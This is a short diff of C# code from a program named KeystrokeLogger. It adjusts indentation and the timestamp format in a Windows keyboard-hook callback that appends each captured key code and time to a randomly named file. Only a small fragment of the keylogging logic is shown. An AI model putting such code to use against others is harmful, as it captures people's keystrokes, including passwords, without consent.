@@ -66,9 +66,9 @@ namespace KeystrokeLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + randomFilename, true);
-               sw.Write((wParam-256) + ",");
+                sw.Write((wParam-256) + ",");
                 sw.Write((Keys)vkCode + ",");
-                sw.Write(Utils.GetTimestamp(DateTime.Now) + "\n");                
+                sw.Write(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") + "\n");                
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
